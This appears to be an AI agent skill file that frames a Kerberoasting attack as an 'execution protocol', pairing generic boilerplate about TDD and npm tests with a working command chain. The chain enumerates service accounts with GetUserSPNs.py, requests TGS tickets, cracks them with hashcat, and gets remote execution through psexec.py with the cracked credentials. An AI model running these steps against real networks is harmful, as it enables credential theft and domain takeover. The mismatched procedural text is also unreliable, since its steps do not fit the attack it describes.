---
name: example-1-domain-compromise-via-kerberoasting
description: Use when executing example 1 domain compromise via kerberoasting protocols within the security sector.
---

# Example 1 Domain Compromise Via Kerberoasting: Execution Protocol

## ⚙️ Overview
This protocol defines the exact standards for implementing Example 1 Domain Compromise Via Kerberoasting. By following this strict operational pattern, the engine guarantees deterministic execution, high performance, and complete adherence to all architectural guardrails established by the system design.

## 🛠️ Implementation SOP
Follow this step-by-step TDD procedure to execute the protocol:

- **Step 1: Baseline Context**: Verify the operational environment. Ensure required tools (like Python, Node, TS, or native CLI) are accessible before injecting new logic.
- **Step 2: Apply the Pattern**: Implement the core example 1 domain compromise via kerberoasting logic directly into the active system context.
- **Step 3: Enforce Constraints**: Check for syntax errors, injection vulnerabilities, and performance bottlenecks (`O(1)` compliance).
- **Step 4: Execute Test Suite**: Run `npm run test` or the local testing framework to ensure the logic passes all regression checks.
- **Step 5: Document and Commit**: Update the session walkthrough and sync the telemetry logs for the security sector.

---

## 📚 Reference Material

# Example 1: Domain Compromise via Kerberoasting

```bash
# 1. Find service accounts with SPNs
GetUserSPNs.py domain.local/lowpriv:password -dc-ip 10.10.10.10

# 2. Request TGS tickets
GetUserSPNs.py domain.local/lowpriv:password -dc-ip 10.10.10.10 -request -outputfile tgs.txt

# 3. Crack tickets
hashcat -m 13100 tgs.txt rockyou.txt

# 4. Use cracked service account
psexec.py domain.local/svc_admin:CrackedPassword@10.10.10.10
```